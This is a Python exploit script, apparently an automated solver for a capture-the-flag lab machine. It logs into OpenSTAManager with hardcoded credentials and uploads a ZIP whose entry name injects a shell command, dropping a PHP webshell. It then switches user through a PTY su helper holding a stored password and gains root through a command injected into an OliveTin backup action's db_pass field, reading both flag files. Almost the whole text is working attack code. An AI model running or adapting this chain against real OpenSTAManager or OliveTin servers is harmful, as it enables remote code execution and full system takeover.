import sys, io, re, base64, zipfile, requests

TARGET   = sys.argv[1] if len(sys.argv) > 1 else "10.129.21.101"
VHOST    = "support_001.enigma.htb"
OSM_USER = "admin"
OSM_PASS = "Ne3s4rtars78s"
HARIS_PW = "bestfriends"
ID_MODULE, ID_PLUGIN = "14", "48"          # Sales invoices / importFE_ZIP
SHELL    = "s.php"                          # dropped under /files/

BASE = f"http://{TARGET}"
H    = {"Host": VHOST}
S    = requests.Session()
S.headers.update(H)
FLAG = re.compile(r"[0-9a-f]{32}")

def log(m): print(f"[*] {m}")
def ok(m):  print(f"[+] {m}")
def die(m): print(f"[-] {m}"); sys.exit(1)

# --- webshell command runner (www-data) ---
def shell(cmd):
    r = S.get(f"{BASE}/files/{SHELL}", params={"0": cmd}, timeout=20)
    return r.text

# run an arbitrary command AS haris via a PTY su-helper dropped on disk
RUN_PY = (
    "import pty,os,sys,time,select,base64\n"
    "cmd=base64.b64decode(sys.argv[1]).decode()\n"
    "pid,fd=pty.fork()\n"
    "if pid==0: os.execvp('su',['su','-','haris','-c',cmd])\n"
    "else:\n"
    " time.sleep(0.4); os.write(fd,b'" + HARIS_PW + "\\n'); out=b''\n"
    " while True:\n"
    "  r,_,_=select.select([fd],[],[],5)\n"
    "  if not r: break\n"
    "  try: d=os.read(fd,4096)\n"
    "  except OSError: break\n"
    "  if not d: break\n"
    "  out+=d\n"
    " sys.stdout.write(out.decode(errors='replace'))\n"
)

def as_haris(cmd):
    b = base64.b64encode(cmd.encode()).decode()
    return shell(f"python3 /tmp/run.py {b}")

# ---------------------------------------------------------------------------
log(f"target {TARGET} (vhost {VHOST})")

# 1) login to OpenSTAManager
S.get(f"{BASE}/", timeout=20)
r = S.post(f"{BASE}/?op=login",
           data={"username": OSM_USER, "password": OSM_PASS},
           allow_redirects=False, timeout=20)
if r.status_code != 302:
    die(f"OSM login failed (HTTP {r.status_code})")
ok(f"logged into OpenSTAManager as {OSM_USER}")

# 2) build malicious ZIP: entry name breaks out of openssl -in "..." and drops a webshell
payload_name = ("1.p7m\";cd files;echo '<?php system($_GET[0]);?>'>" + SHELL +
                ";echo \"1.p7m")
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    z.writestr(payload_name, "AAAA")
buf.seek(0)

S.post(f"{BASE}/actions.php",
       data={"op": "save", "id_module": ID_MODULE, "id_plugin": ID_PLUGIN},
       files={"blob1": ("evil.zip", buf, "application/zip")},
       timeout=30)  # 500 expected (invoice parse fails after injection fires)

who = shell("id")
if "www-data" not in who:
    die("webshell not responding -- RCE may have failed")
ok(f"RCE as www-data ({who.strip()})")

# 3) drop the haris PTY-su helper, then read user flag
shell("echo " + base64.b64encode(RUN_PY.encode()).decode() + " | base64 -d > /tmp/run.py")
u = as_haris("cat /home/haris/user.txt")
mu = FLAG.search(u)
if not mu:
    die("could not read user.txt as haris")
USER_FLAG = mu.group(0)
ok(f"user.txt = {USER_FLAG}")

# 4) root via OliveTin guest backup_database db_pass injection (must come from haris)
import json
oj = json.dumps({
    "actionId": "backup_database",
    "arguments": [
        {"name": "db_user", "value": "backup_svc"},
        {"name": "db_pass", "value": "x' ; cat /root/root.txt ; #"},
        {"name": "db_name", "value": "production"},
    ],
})
ojb = base64.b64encode(oj.encode()).decode()
haris_cmd = (f"echo {ojb} | base64 -d > /tmp/p.json && "
             "curl -s -m12 -X POST "
             "http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait "
             "-H 'Content-Type: application/json' -d @/tmp/p.json")
rt = as_haris(haris_cmd)
mr = FLAG.search(rt)
if not mr:
    die(f"OliveTin injection failed:\n{rt}")
ROOT_FLAG = mr.group(0)
ok(f"root.txt = {ROOT_FLAG}")

print("\n" + "=" * 40)
print(f"  USER : {USER_FLAG}")
print(f"  ROOT : {ROOT_FLAG}")
print("=" * 40)
